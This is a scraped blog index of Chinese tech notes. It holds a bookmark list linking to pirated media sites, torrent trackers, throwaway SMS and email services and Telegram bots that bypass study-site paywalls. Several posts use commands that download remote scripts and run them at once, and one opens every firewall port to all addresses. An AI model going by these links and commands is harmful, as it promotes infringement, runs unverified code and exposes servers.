https://switch520.com/ 3DM单机游戏: https://www.3dmgame.com/ 游民星空单机游戏: https://down.gamersky.com/ 模拟器游戏: https://www.okemu.com/catalog_down.html 小霸王游戏: https://www.yikm.net/ 俄罗斯最大盗版游戏网站: https://byrut.org/ 乐猪游戏: https://www.lezhugame.com/ 霹雳分享: https://www.pilifx.com/ 小妖怪分享: https://www.xyg688.com/ 游戏天堂: https://www.zzzz688.com/ 宅科技: https://sptuner.blogspot.com/ 9damaogame论坛: http://www.9damaogame.net/ All Game For You: https://agfy.co/ CrackedGames: https://cracked-games.org/ Steamunlocked: https://steamunlocked.net/ Skidrowreloaded: https://www.skidrowreloaded.com/ Kaoskrew: https://kaoskrew.org/ Megagames: https://megagames.com/ Moddb: https://www.moddb.com/ 二次元世界的入口 Beep Anime: https://www.bimiacg4.net/ Forest House Anime: https://www.senfun.net/ Otherworldly Anime: https://www.ysjdm.net/ AGE Anime: http://www.age.tv/ ZzzFun Anime: http://www.zzzfun.com/ OmoFun Anime: https://omofun.tv/ Sakura Anime: http://www.yinghuacd.com/ Yi Xuan Anime: http://www.yxdm.li/ Nicole Anime: http://www.nicotv.me/ Qiqi Animation: https://www.qiqidongman.com/ PPT 完美呈现 Figure Monster: https://818ps.com/ PPT Treasure: pptbz.com Chameleon PPT: ppt20.com 51PPT template network: 51pptmoban.com PPT: ypppt.com Bigg PPT: tretars.com PPT Supermarket: pptsupermarket.com OneKeyTools: oktools.xyz Microft: templates.office.com OfficePLUS: officeplus.cn 1st PPT: 1ppt.com PPT Courseware Network: pptkj.net Wudao PPT: woodo.cn Performance.com: yanj.cn Jingle Bell Design: dingdangsheji.com PPT House: 52ppt.com PPTBOSS: pptboss.com Justfreeslide: justfreeslide.com PPTSTORE: pptstore.net 世界最大演示文稿PPT分享平台: https://www.slideshare.net/ 设计灵感触发器 ✨ pngpix 免抠图: https://www.pngpix.com/ librestock 无版权图库: https://librestock.com/ icomoon 免费矢量小图标库: https://icomoon.io/app/#/select vecteey 图片 矢量图 视频: https://www.vecteezy.com/ gratisography 免费图片: https://gratisography.com/ undraw.co 免费插画: https://undraw.co/illustrations icons8.com 矢量插画: https://icons8.com/illustrations absurd.design 矢量插画: https://absurd.design/ humaaans.com 矢量人物插画: https://www.humaaans.com/ gallery.manypixels.co 免费插画: https://gallery.manypixels.co/ iradesign.io 矢量插画: https://iradesign.io/ drawkit.io 免费插画: https://www.drawkit.io/?ref=lapaninja lukaszadam.com 开源矢量插画: https://lukaszadam.com/illustrations react-kawaii.vercel.app 开源插画图标: https://react-kawaii.vercel.app/ freevector.com 矢量图: www.freevector.com/ glazestock.com 免费插画素材库: https://www.glazestock.com/ opendoodles.com 手绘插图: https://www.opendoodles.com/ iconscout.com 免费插图: https://iconscout.com/free-illustrations manypixels.co 免费插画: https://www.manypixels.co/gallery mixkit.co 免费插画: https://mixkit.co/free-stock-art/ fresh-folk.com 免费插画: https://fresh-folk.com/ delesign.com 免费插画: https://delesign.com/free-designs/graphics/ icons8.com 免费矢量插图设计工具: https://icons8.com/mega-creator 捕捉精彩瞬间 ⏺️ Apowersoft免费在线录屏: http://t.cn/RfoHYiO ScreenToGif : https://www.screentogif.com/ Bandicam: https://wwc.lanzoul.com/i0cit0216oed OBS Studio: https://obsproject.com/ GifCam: http://t.cn/RfbD8rf LICEcap: http://t.cn/R9TRp9B 使用教程：http://t.cn/RZTvP2f screenflow: https://wwc.lanzoul.com/inmtS0216n9c EV录屏: https://wwc.lanzoul.com/iOc1j0215gkf 总下载: https://wwc.lanzoul.com/b00vgnwsb 密码:bbrg 思维跃然纸上 Diagrams.net: https://app.diagrams.net/ Wireflow: https://wireflow.co/ 百度脑图: https://naotu.baidu.com/ ProcessOn: https://www.processon.com/ GitMind: https://gitmind.cn/ Zhixi: https://www.zhixi.com/ MindLine: https://www.mindline.cn/webapp HuatuBen: https://huatuben.com/mindmap/new 追剧时光 低端影视: https://ddrk.me/ 片库: https://www.pianku.li/ 七七看片: https://www.77kpp.com/ 旋风视频: https://miao101.com/ 体育直播: https://feisuzhibo.com BD影视分享: https://www.bd2020.com/ 茶杯狐 Cupfox（综合搜索） : https://www.cupfox.com 豌豆PRO（综合搜索）: https://www.wandou.pro/ 电影先生： http://www.dianyingim.com 8 K 影视： http://www.8kvod.com/ 乐猪 T V （手机访问）： http://www.lezhutv.com 金鹰资源采集网： https://jinyingzy.net/ 努努影视： https://www.nunuyy5.org/ Free OK： https://www.freeok.vip/ 天空影视： http://tkznp.com/ 耐看点播： https://www.nkvod.cc/ 看剧吧6： http://kanjuba6.com/ 蓝光影视： https://www.lgyy.cc/ KKDY live： https://www.kkdy.live/ 大米星球： https://www.dmxq.fun/ HOHO TV： https://www.hoho.tv/ 麻花影视： https://www.imahuatv.com/ 一刻电影： https://www.yikedy.top/ 4k影视： https://www.4kvm.com/ 酷片网： https://www.kupian.cc/ 电影天堂,： https://www.bbaaa.com/ VV8影视网： http://www.vv8.com/ 星辰影院： https://www.35kan.com/ 蜜瓜电影网： https://www.migua818.com/ Kan4K： https://www.kan4k.com/ 多多视频： http://m.rr.tv/ 1080电影网： http://1080dvd.cn/ 莫扎兔： https://www.mozhatu.com/ 蓝光影院 ： https://www.lgyy.vip/ voflix HD： https://www.voflix.com/ 茶杯虎： https://www.725998.com/ Nike影视网： https://www.ajeee.com/ 蛋蛋赞影院： https://www.dandanzan10.top/ 厂长资源 ： https://czzy01.com/ 电影天堂： https://www.dytt8.net/index2.htm 皮皮鲁影视： https://www.pp6.xyz/index.html 新剧场： https://www.xinjuc.com/ HDmoli： https://www.hdmoli.com/ 大树的影仓： https://www.btnull.re COKEMV： https://cokemv.co/ ZzzFun动漫视频网： http://www.zzzfun.com/ MK影视： https://www.mkvdo.com/ LIBVIO影视： https://tv.libvio.cc/ 6v电影 ： http://www.66s.cc/ AG美剧（又名阿哥美剧）： http://agmov.com/ 爱迪影视： https://aidi.tv/ 在线之家： https://www.zxzj.pro/ 中国高清网： https://gaoqing.la/ 高清电台|： https://gaoqing.fm/ 日剧TV网： http://www.bhbb.pw/ Gimy 劇迷： https://gimy.app/ 100分影院： http://www.100fyy1.com/ AGE动漫： https://www.agemys.net/ 樱花动漫网： https://www.740st.com/ 麦豆TV ： http://www.mdoutv.com/ 爱迪影视： https://adys.me/ 嘶哩嘶哩： https://www.silisili.tv/ 干饭影视： https://gfysys.com/ 天空影视： http://tkys6.com/ sflix.to： https://sflix.to/home myflixertv.to： https://myflixertv.to/ 123moviesfree.net： https://ww1.123moviesfree.net/ ffmovies.sc： https://vw1.ffmovies.sc/ egybest.co： https://back.egybest.co/ 动漫世界 ZzzFun动漫: http://www.zzzfun.com/ 樱花动漫: http://www.yinghuacd.com/ AGE动漫: https://www.agefans.vip/ 動畫線上看: https://anime1.me/ 嘀哩嘀哩: https://www.dilidili55.com/ 艺术之旅 俄罗斯线上博物馆: https://gallerix.asia/ 法国罗浮宫资料库: https://collections.louvre.fr/en/ 美国国会图书馆浮世绘画作: https://www.loc.gov/collections/japanese-fine-prints-pre-1915/ 芝加哥艺术博物馆: https://www.artic.edu/collection 美国国会图书馆老照片、海报影片: https://www.loc.gov/free-to-use/ PPT 速成宝典 优品PPT: www.ypppt.com OfficePLUS: www.officeplus.cn 演示星球: www.pop-ppt.com ppt宝藏: www.pptbz.com 叮当设计: www.dingdangsheji.com slidesgo: www.slidesgo.com 图片编辑魔法棒 在线抠图: www.aigei.com/bgremover logo在线制作: www.yeelogo.com 图片尺寸裁剪: tool.c7sky.com&#x2F;image-resize 图片格式转换: www.dute.org/image-converter 图片加水印: tool.c7sky.com&#x2F;image-watermark 图片去水印: www.apowersoft.cn/image-watermark-remover 圆角图片制作: www.dute.org/image-round 人工智能图片无损放大: bigjpg.com 图片在线压缩: www.picdiet.com/zh-cn 在线智能抠图网站: https://www.remove.bg/zh 资源搜索利器 海盗湾: https://thepiratebay.org/ RARBG: https://rarbg.to/ 恶魔网: https://www.demonoid.is/ Nyaa: https://nyaa.si/ BT4G: https://bt4g.org/ 动漫花园: https://www.dmhy.org/ 邮箱小号 Mail.td: https://mail.td/zh Mail.tm: https://mail.tm/zh/ Spambox: https://spambox.xyz/ Maildrop: https://maildrop.cc/ Mohmal: https://www.mohmal.com/zh 24mail: http://24mail.chacuo.net/ NowMyMail: https://www.nowmymail.com/ CrazyMailing: https://www.crazymailing.com/login 10minutemail: https://10minutemail.com/ MyTrashMail: http://www.mytrashmail.com/ ClipMails: https://www.clipmails.com/ TempMail: https://tempmail.altmails.com/ Mailpoof: https://mailpoof.com/zh Gmailnator: https://www.gmailnator.com/ Disposablemail: https://www.disposablemail.com/ EmailOnDeck: https://www.emailondeck.com/ TempInbox: http://www.tempinbox.com/ GuerrillaMail: https://www.guerrillamail.com/ DropMail: https://dropmail.me/zh/ Moakt: https://www.moakt.com/ Mailsac: https://mailsac.com/ Linshi-email: https://www.linshi-email.com/ SnapMail: https://www.snapmail.cc/#/ Mail.mjj.edu.ge: https://mail.mjj.edu.ge/ 20minutemail: https://www.20minutemail.com/#top 8164.cc: https://www.8164.cc/#/emailList/all Mailnesia: http://mailnesia.com/ iHotMails: https://ihotmails.com/ Temp-Mail: https://temp-mail.io/zh 软件指南 Product Hunt: https://www.producthunt.com/ AlternativeTo: https://alternativeto.net/ SaaSHub: https://www.saashub.com/ Alternative: https://alternative.me/ Slant: https://www.slant.co/ SimilarSites: https://www.similarsites.com/ StackShare: https://stackshare.io/ FileHorse: https://www.filehorse.com/ 音乐畅听 Yinyueke: https://www.yinyueke.net/ Music.alang.run: http://music.alang.run Tools.liumingye.cn: http://tools.liumingye.cn/music/?page=searchPage Netease-music.fe-mm.com: https://netease-music.fe-mm.com/#/music/playlist Music.qier222.com: https://music.qier222.com/#/ Tonzhon.com: https://tonzhon.com/ Ayy.ayxhk.com: http://ayy.ayxhk.com/ Peal.cc: https://peal.cc/player 智能助手 傻妞机器人: https://github.com/cdle/sillyGirl 图灵机器人: http://www.turingapi.com/ 青云客智能聊天机器人: http://api.qingyunke.com/ 智能闲聊（腾讯）: https://ai.qq.com/ 天行机器人: https://www.tianapi.com/apiview/47 海知智能: https://ruyi.ai/ 思知对话机器人: https://www.ownthink.com/ 一个AI: http://www.yige.ai/ 小I机器人: https://www.xiaoi.com/index 茉莉机器人: https://mlyai.com/ 茉莉QQ机器人 项目: https://github.com/xggz/mqr 茉莉QQ机器人 文档: http://mqr.molicloud.com/ QQBotHub 项目: https://github.com/yiyungent/QQBotHub QQBotHub 文档: https://moeci.com/QQBotHub/#/ 高效率 QQ 机器人支持库: https://github.com/mamoe/mirai WeChat SDK for Go 项目: https://github.com/silenceper/wechat WeChat SDK for Go 文档: https://silenceper.com/wechat/ 微信助手: https://github.com/sfyc23/EverydayWechat 微信每日说: https://github.com/leochen-g/wechatBot PDF 处理能手 smallPDF： https://smallpdf.com/ Online OCR： https://www.onlineocr.net/ PDF to Word Converter： https://www.pdftoword.com/ 加加PDF： https://www.addpdf.cn/pdf-to-word ilovePDF： https://www.ilovepdf.com/ PDFconverter： https://www.pdfconverter.com PDFbao： http://www.pdfbao.com/ LightPDF： https://lightpdf.com/zh/ cloudconvert： https://cloudconvert.com/pdf-to-doc 迅捷PDF转换器： https://app.xunjiepdf.com/ UPDF： https://www.updf.cn/updf/ PDF2go： https://www.pdf2go.com/zh/ ABBYY FineReader： https://ocr.abbyy.cn/ PDF.IO： https://pdf.io/tw/ PDFtodoc： http://pdf2doc.com/zh/ pdfcandy： https://pdfcandy.com/cn/ 记灵工具： https://remeins.com/ 超级PDF： https://xpdf.cn/ PDF24 Tools： https://tools.pdf24.org/zh/ ALL TO ALL： https://www.alltoall.net/ API 接口 京东云： https://wx.jdcloud.com/api APISpace： https://www.apispace.com/ 百度： https://apis.baidu.com/ 微博： https://open.weibo.com/wiki/API 百度AI： http://ai.baidu.com/ 聚合： https://www.juhe.cn/ 旷视人脸： https://www.faceplusplus.com.cn/ 融云： https://www.rongcloud.cn/ 讯飞： https://www.xfyun.cn/ 高德： https://lbs.amap.com/ 翻译服务API申请步骤 百度翻译： https://hcfy.app/docs/services/baidu-api 腾讯翻译： https://hcfy.app/docs/services/qq-api 彩云小译： https://hcfy.app/docs/services/caiyun-api 阿里翻译： https://hcfy.app/docs/services/ali-api 有道翻译： https://hcfy.app/docs/services/youdao-api 火山翻译： https://hcfy.app/docs/services/hs-api 百度文字识别： https://hcfy.app/docs/services/baidu-ocr 接码平台 国内接码平台 storytrain.info： https://www.storytrain.info/ yunjisms.xyz： https://yunjisms.xyz/ mianfeijiema.com： https://mianfeijiema.com/ 114sim.com： http://www.114sim.com/ mianfeisms.xyz： https://www.mianfeisms.xyz/ lothelper.com： https://www.lothelper.com/cn/shownumber jiemahao.com： https://jiemahao.com/ yunduanxin.net： https://yunduanxin.net/Countries/ zusms.com： https://www.zusms.com/ yunjiema.net： https://yunjiema.net/ zh.mytrashmobile.com： https://zh.mytrashmobile.com/ k8s1.com： https://www.k8s1.com/ sososms.com： http://www.sososms.com/index.html bestsms.xyz： https://bestsms.xyz/ metacnnet.com： https://www.metacnnet.com/index.html 国外接码平台 america.storytrain.info： https://america.storytrain.info/home receive-sms-online.info： https://receive-sms-online.info/ freeonlinephone.org： https://www.freeonlinephone.org/ receivefreesms.com： http://receivefreesms.com/ sms.sellaite.com： https://sms.sellaite.com/ inlet.tel： https://inlet.tel/ sms24.me： https://sms24.me/en smscodeonline.com： https://smscodeonline.com/ sms-man.com： https://sms-man.com/ receive-sms-free.cc： https://receive-sms-free.cc/ 7sim.org： https://7sim.org/ ch.freephonenum.com： https://ch.freephonenum.com/ smsreceivefree.com： https://smsreceivefree.com/ receiveasms.com： https://receiveasms.com/ sms-online.co： https://sms-online.co/receive-free-sms Markdown 编辑器 Typora[付费]： https://typoraio.cn/ Typora 学习版： https://wwc.lanzoul.com/i7bBz09yhk8j Arya： https://markdown.lovejade.cn/ Arya 项目： https://github.com/nicejade/markdown-online-editor react-markdown-editor-lite： https://harrychen0506.github.io/react-markdown-editor-lite/ react-markdown-editor-lite 项目： https://github.com/HarryChen0506/react-markdown-editor-lite 墨滴软件-mdnice[付费]： https://product.mdnice.com/ 妙言-Mac： https://miaoyan.app/ 妙言-Mac 项目： https://github.com/tw93/MiaoYan Editor： https://pandao.github.io/editor.md/ Editor 项目： https://github.com/pandao/editor.md Obsidian： https://obsidian.md/ Obsidian 中文论坛： https://forum-zh.obsidian.md/ 思源笔记[付费]： https://b3log.org/siyuan/ 思源笔记 项目： https://github.com/siyuan-note/siyuan Doocs： https://doocs.github.io/md/ Doocs 项目： https://github.com/doocs/md WeChat Format： https://lab.lyric.im/wxformat/ WeChat Format 项目： https://github.com/lyricat/wechat-format MWeb Pro[付费]： https://zh.mweb.im/ MarkText： https://marktext.app/ MarkText 项目： https://github.com/marktext/marktext Markdoc： https://markdoc.dev/ Markdoc 项目： https://github.com/markdoc/markdoc LetsMarkdown： https://letsmarkdown.com/ LetsMarkdown 项目： https://github.com/Cveinnt/LetsMarkdown.com QOwnNotes： https://www.qownnotes.org/ QOwnNotes 项目： https://github.com/pbek/QOwnNotes MDX Editor： https://editor.runjs.cool/ MDX Editor 项目： https://github.com/maqi1520/mdx-editor effie： https://www.effie.co/ md-editor-v3： https://imzbf.github.io/md-editor-v3/index md-editor-v3 项目： https://github.com/imzbf/md-editor-v3 MarkPad 项目： https://github.com/Code52/DownmarkerWPF MarkPad 网站： http://code52.org/DownmarkerWPF/ 可能吧 Markdown to 公众号一键转换器： https://knb.im/mp/ Md2ALL： http://md.aclickall.com/ mdfmt 项目： https://github.com/elliotxx/mdfmt Notable： https://notable.app/# Notable 项目： https://github.com/notable/notable Milkdown： https://milkdown.dev/ Milkdown 项目： https://github.com/Saul-Mirone/milkdown HedgeDoc： https://hedgedoc.org/ HedgeDoc 项目： https://github.com/hedgedoc/hedgedoc ShowDoc[付费]： https://www.showdoc.com.cn/ ShowDoc 项目： https://github.com/star7th/showdoc Pine： https://lukakerr.github.io/Pine/ Pine 项目： https://github.com/lukakerr/Pine Zettlr ： https://www.zettlr.com/ Zettlr 项目： https://github.com/Zettlr/Zettlr VNote： https://vnotex.github.io/vnote/zh_cn/ VNote 项目： https://github.com/vnotex/vnote 学习助手 slideshare： https://www.slideshare.net/ slideshare 电报下载： https://t.me/slidesharebynx Scribd： https://es.scribd.com/ Scribd 电报下载： https://t.me/Scribdbynx Studocu： http://studocu.com/ Studocu 电报下载： https://t.me/studocubynx Academia： https://www.academia.edu/ Academia 电报下载： https://t.me/Academicbynx Bartleby： https://www.bartleby.com/ Bartleby 电报下载： https://t.me/BartlebyByNX Coursehero： https://www.coursehero.com Coursehero 电报下载: https://t.me/Courseherovipbot Numerade： https://www.numerade.com Numerade 电报下载： https://t.me/NumeradebyNX chegg： https://www.chegg.com/ chegg 电报下载： https://t.me/chegg_nx Issuu： https://issuu.com/ Issuu 电报下载： https://t.me/nxexpro Issuu 网站下载： https://issuudownload.com/ Issuu 网站下载： https://vebuka.com/ Transtutor： https://www.transtutors.com/ Transtutor 电报下载： https://t.me/transtutorbynx Study.com： https://study.com Study.com 电报下载： https://t.me/studybynx Queseba： https://www.quesba.com/ Queseba 电报下载： https://t.me/Quesbabynx Gauthmath： https://www.gauthmath.com/ Gauthmath 电报下载： https://t.me/GauthmathbyNX wyzant： https://www.wyzant.com/ wyzant 电报下载： https://t.me/wyzantbynx Socratic： https://socratic.org/ Brainly： https://brainly.ph/ Brainly 电报下载： https://t.me/Brainlybynx Solutioninn： https://www.solutioninn.com/ Solutioninn 电报下载： https://t.me/solutioninnbynx Wegglab： https://wegglab.com Wegglab 电报下载： https://t.me/wegglabbyNX Studypool： https://www.studypool.com/ Studypool 电报下载： https://t.me/studypoolbynx Quizlet： https://quizlet.com/ Quizlet 电报下载： https://t.me/QuizletbyNX 在线课程搜索引擎 classcentral： https://www.classcentral.com/ 与书对话 Talk to Books： https://books.google.com/talktobooks/ 视频解析 playerjy&#x2F;B站： https://jx.playerjy.com/?url= ccyjjd： https://ckmov.ccyjjd.com/ckmov/?url= 爱豆： https://jx.aidouer.net/?url= 诺诺： https://www.ckmov.com/?url= H8： https://www.h8jx.com/jiexi.php?url= BL： https://vip.bljiex.com/?v= 解析la： https://api.jiexi.la/?url= MUTV： https://jiexi.janan.net/jiexi/?url= MAO： https://www.mtosz.com/m3u8.php?url= 老板： https://vip.laobandq.com/jiexi.php?url= 盘古： https://www.pangujiexi.cc/jiexi.php?url= 盖世： https://www.gai4.com/?url= 星空： http://60jx.com/?url= 0523： https://go.yh0523.cn/y.cy?url= 17云： https://www.1717yun.com/jx/ty.php?url= 4K： https://jx.4kdv.com/?url= 云析： https://jx.yparse.com/index.php?url= 8090： https://www.8090g.cn/?url= 180： https://jx.000180.top/jx/?url= 无名： https://www.administratorw.com/video.php?url= 听乐(B站)： https://jx.dj6u.com/?url= 诺讯： https://www.nxflv.com/?url= PM： https://www.playm3u8.cn/jiexi.php?url= 奇米： https://qimihe.com/?url= 免费托管服务 000webhost.com Freehostia.com Jimdo.com FreeHosting.com xtreemhost.com Zymic.com Byethost.com 110MB.com AwardSpace.com 1FreeHosting.com FreeHostingEU.com Uhostfull.com 50Webs.com ZettaHost.com x10hosting.com 海外影视 sflix.to： https://sflix.to/home myflixertv.to： https://myflixertv.to/ 123moviesfree.net： https://ww1.123moviesfree.net/ ffmovies.sc： https://vw1.ffmovies.sc/ egybest.co： https://back.egybest.co/ 体育赛事直播 ⚽ jrkan.com： http://www.jrkan.com/ 88kanqiu.tv： http://www.88kanqiu.tv/ leqiuba.com： https://leqiuba.com/ feisuzhibo.com： https://feisuzhibo.com/ qw183.com： http://www.qw183.com/ hulizb.tv： http://hulizb.tv/ qttzb.com： https://www.qttzb.com/ uuqiu.com： http://uuqiu.com/#/ jrs.xianshidaojia.cn： http://jrs.xianshidaojia.cn/ zhibo8.cc： https://www.zhibo8.cc/ 精美壁纸 Awesome Wallpapers： https://wallhaven.cc WallpaperHub： https://wallpaperhub.app 极简壁纸： https://bz.zzzmh.cn/index Anime Wallpapers： https://konachan.net/post Anime pictures and wallpapers： https://anime-pictures.net 必应每日高清壁纸： https://bing.ioliu.cn Wallpaper Abyss： https://wall.alphacoders.com Moviemania： https://www.moviemania.io/phone 故宫壁纸： https://www.dpm.org.cn/lights/royal.html Images | ESO： https://www.eso.org/public/images Simple Desktops： http://simpledesktops.com Unsplash： https://unsplash.com 免费素材图片： https://www.pexels.com/zh-cn Wallpaper Cave： https://wallpapercave.com Desktop wallpapers hd： https://wallpaperscraft.com 装机必备 Potplayer： https://daumpotplayer.com/download/ IINA： https://github.com/iina/iina Everything： https://www.voidtools.com/zh-cn/ listary： https://www.listary.com/ total commands： http://www.ghisler.com/ Directory Opus： https://www.gpsoft.com.au/ Bigjpg： https://bigjpg.com/ Photozoom： https://www.projects-software.com/projects-family Anki： https://apps.ankiweb.net/ Bandzip： https://www.bandisoft.com/ 7-zip： https://www.7-zip.org/ WinRAR： https://www.win-rar.com/ iSlide： https://www.islide.cc/ Piti： http://www.piti.fun/ 口袋动画： https://www.pptx.cn/16269.html OneKeyTools： http://oktools.xyz/ PDFescape： https://www.pdfescape.com/ Grammarly： https://www.grammarly.com/ 1Checker： http://www.1checker.com/ 秘塔写作猫： https://xiezuocat.","categories":[],"tags":[{"name":"收藏网站","slug":"收藏网站","permalink":"http://example.com/tags/%E6%94%B6%E8%97%8F%E7%BD%91%E7%AB%99/"}]},{"title":"德机euserv一键部署","slug":"德机euserv一键部署","date":"2024-06-28T03:24:30.000Z","updated":"2024-06-28T03:27:47.649Z","comments":true,"path":"2024/06/28/德机euserv一键部署/","permalink":"http://example.com/2024/06/28/%E5%BE%B7%E6%9C%BAeuserv%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2/","excerpt":"","text":"Euserv服务器Euserv一键安装教程 首选需要一个EUserv的免费实例，怎么注册油管上有很多教程，我这里就不多说了。 用SSH登录后 第一步输入 1echo -e &quot;nameserver 2001:67c:2b0::4\\nnameserver 2001:67c:2b0::6&quot; &gt; /etc/resolv.conf 第二步安装wget、curl 123456Centosyum update &amp;&amp; yum install -y wget curlDebianapt update &amp;&amp; apt install wget curl -yUbuntuapt-get update &amp;&amp; apt-get install wget -y 第三步安装WARP 1wget -N https://cdn.jsdelivr.net/gh/fscarmen/warp/menu.sh &amp;&amp; bash menu.sh [option] [lisence] 选为 ipv6 only 添加 ipv4 选免费 选IPV4优先 第四步输入mack a 的一键脚本 1wget -P /root -N --no-check-certificate &quot;https://raw.githubusercontent.com/mack-a/v2ray-agent/master/install.sh&quot; &amp;&amp; chmod 700 /root/install.sh &amp;&amp; /root/install.sh 智能解析DNS服务，我选择N 安装成功复制一下代码就OK了","categories":[],"tags":[{"name":"euserv,永久免费服务器","slug":"euserv-永久免费服务器","permalink":"http://example.com/tags/euserv-%E6%B0%B8%E4%B9%85%E5%85%8D%E8%B4%B9%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"linux_防火墙","slug":"linux-防火墙","date":"2024-06-28T02:39:49.000Z","updated":"2024-06-28T02:54:50.003Z","comments":true,"path":"2024/06/28/linux-防火墙/","permalink":"http://example.com/2024/06/28/linux-%E9%98%B2%E7%81%AB%E5%A2%99/","excerpt":"","text":"firewalld###1.允许所有ip访问 123firewall-cmd --zone=public --add-source =0.0.0.0/0 firewall-cmd --zone=public --add-port=1-65535/tcp --permanentfirewall-cmd --zone=public --add-port=1-65535/udp --permanent ###2.重载 1firewall-cmd --reload ###允许指定 IP 访问 8000 端口 1234567# 允许指定 IP 访问 8000 端口firewall-cmd --zone=public --add-rich-rule &#x27;rule family=&quot;ipv4&quot; source address=&quot;&lt;指定IP&gt;&quot; port protocol=&quot;tcp&quot; port=&quot;8000&quot; accept&#x27; --permanent#拒绝firewall-cmd --zone=public --add-rich-rule &#x27;rule family=&quot;ipv4&quot; source address=&quot;&lt;指定IP&gt;&quot; port protocol=&quot;tcp&quot; port=&quot;8000&quot; drop&#x27; --permanent","categories":[],"tags":[{"name":"firewalld","slug":"firewalld","permalink":"http://example.com/tags/firewalld/"}]},{"title":"wls迁移docker数据","slug":"wls迁移docker数据","date":"2024-06-25T06:39:13.000Z","updated":"2024-06-25T06:42:08.732Z","comments":true,"path":"2024/06/25/wls迁移docker数据/","permalink":"http://example.com/2024/06/25/wls%E8%BF%81%E7%A7%BBdocker%E6%95%B0%E6%8D%AE/","excerpt":"","text":"123456789列出wsl -l --all -vwsl --shutdown导出wsl --export docker-desktop-data E:\\docker_data.tar注销wsl --unregister docker-desktop导入wsl --import docker-desktop E:\\docker_image\\ E:\\docker_image\\docker-desktop.tar","categories":[],"tags":[{"name":"docker,wsl","slug":"docker-wsl","permalink":"http://example.com/tags/docker-wsl/"}]},{"title":"Windows包管理器Scoop的安装与配置全指南","slug":"Windows包管理器Scoop的安装与配置全指南","date":"2024-06-25T04:35:26.000Z","updated":"2024-06-25T04:36:25.889Z","comments":true,"path":"2024/06/25/Windows包管理器Scoop的安装与配置全指南/","permalink":"http://example.com/2024/06/25/Windows%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8Scoop%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%85%A8%E6%8C%87%E5%8D%97/","excerpt":"","text":"Windows包管理器Scoop的安装与配置全指南Scoop是一款Windows上的命令行包管理器，它可以让用户更加方便地安装、更新和管理软件。与其他包管理器相比，Scoop具有不需要管理员权限、易于安装和隔离软件包等优点。本教程将详细介绍如何在Windows上安装和配置Scoop，包括设置PowerShell远程权限、更新PSReadLine以支持自动补全、下载安装Scoop以及添加额外的软件仓库。 正文：1. 在PowerShell中设置远程权限在安装Scoop之前，首先需要确保你的PowerShell具有执行远程脚本的权限。这是因为Scoop的安装脚本需要从Internet下载。打开PowerShell，并输入以下命令： 12Set-ExecutionPolicy RemoteSigned -scope CurrentUser1 此命令将当前用户的执行策略设置为RemoteSigned，允许运行本地脚本和已签名的远程脚本。 2. 更新PSReadLine以支持自动补全为了提升命令行使用体验，建议更新PSReadLine模块。PSReadLine提供了诸如语法高亮、自动补全等功能。运行以下命令来更新PSReadLine并配置Tab键自动补全： 123sudo Install-Module PSReadLine -ForceSet-PSReadlineKeyHandler -Chord Tab -Function MenuComplete12 3. 下载并安装Scoop接下来，使用以下命令下载Scoop的安装脚本并执行安装。你可以指定Scoop的安装目录和全局软件安装目录： 12irm get.scoop.sh | iex1 如果你想自定义Scoop及其全局应用程序的安装位置，可以使用如下命令： 12irm get.scoop.sh -outfile &#x27;install.ps1&#x27;.\\install.ps1 -ScoopDir &#x27;你想把scoop安装到那个目录&#x27; -ScoopGlobalDir &#x27;Scoop未来安装全局软件的目录&#x27; -NoProxy1 对于需要管理员权限安装到系统范围的情况，使用以下命令： 123iwr -useb get.scoop.sh -outfile &#x27;install.ps1&#x27;.\\install.ps1 -RunAsAdmin12 4. 添加额外的软件仓库Scoop本身带有主要仓库，但是你可以通过添加额外的bucket（仓库）来扩展可安装的软件范围。以下是一些常用的额外仓库及安装命令： 1234567scoop bucket add extrasscoop bucket add scoopet https://github.com/ivaquero/scoopetscoop bucket add javascoop bucket add versionsscoop bucket add dorado https://github.com/chawyehsu/doradoscoop bucket add nerd-fonts123456 5. 启用Aria2加速下载Scoop支持使用Aria2作为下载工具来加速下载过程。首先，安装Aria2： 12scoop install aria21 然后，启用Aria2下载加速： 12scoop config aria2-enabled true1 继续我们的Scoop教程，下面我将介绍一些Scoop的常用命令，这些命令将帮助你更有效地管理Windows上的软件。 Scoop的常用命令查看已安装的软件12scoop list1 这个命令会列出你通过Scoop安装的所有软件包，让你快速了解当前安装了哪些工具和应用。 安装软件12scoop install &lt;软件名&gt;1 这是Scoop最常用的命令之一，用于安装你需要的软件。例如，如果你想安装Git，只需运行scoop install git。 更新软件12scoop update &lt;软件名&gt;1 当软件发布新版本时，你可以使用这个命令来更新特定的软件。如果想更新所有已安装的软件，可以省略软件名，直接运行scoop update。 卸载软件12scoop uninstall &lt;软件名&gt;1 当你不再需要某个软件时，可以使用这个命令将其从系统中卸载。 搜索软件12scoop search &lt;软件名&gt;1 如果你不确定Scoop是否有你需要的软件，可以使用这个命令进行搜索。它会在所有已知的仓库中查找匹配的软件包。 查看软件信息12scoop info &lt;软件名&gt;1 这个命令提供了关于特定软件的详细信息，包括版本、依赖、安装后的大小等。 清理旧版本软件12scoop cleanup &lt;软件名&gt;1 随着时间的推移，更新软件会留下旧版本的文件。使用这个命令可以删除旧版本，释放磁盘空间。如果省略软件名，Scoop将尝试清理所有软件的旧版本。 查看已添加的仓库（Bucket）12scoop bucket list1 这个命令显示所有你已添加的仓库。仓库是包含软件包的集合，Scoop通过仓库来组织软件。 添加仓库12scoop bucket add &lt;仓库名&gt; [仓库地址]1 通过这个命令，你可以添加更多的仓库来扩展可安装软件的范围。仓库名是必需的，仓库地址是可选的，如果是已知的仓库，可以省略地址。 查看可用的内核（Kernel）12scoop status1 这个命令可以查看Scoop的状态，包括是否有软件需要更新。 通过掌握这些基本命令，你就能充分利用Scoop来管理Windows上的软件了。Scoop的设计理念是简化Windows软件的安装和管理过程，希望这些命令能帮你更好地实现这一目标。","categories":[],"tags":[{"name":"scoop","slug":"scoop","permalink":"http://example.com/tags/scoop/"}]},{"title":"","slug":"masscan使用参数记录","date":"2024-03-15T07:06:53.626Z","updated":"2024-03-15T07:07:28.246Z","comments":true,"path":"2024/03/15/masscan使用参数记录/","permalink":"http://example.com/2024/03/15/masscan%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"端口扫描工具（masscan）使用参数扫描指定网段范围的指定端口123copymasscan -p80,8080-8100 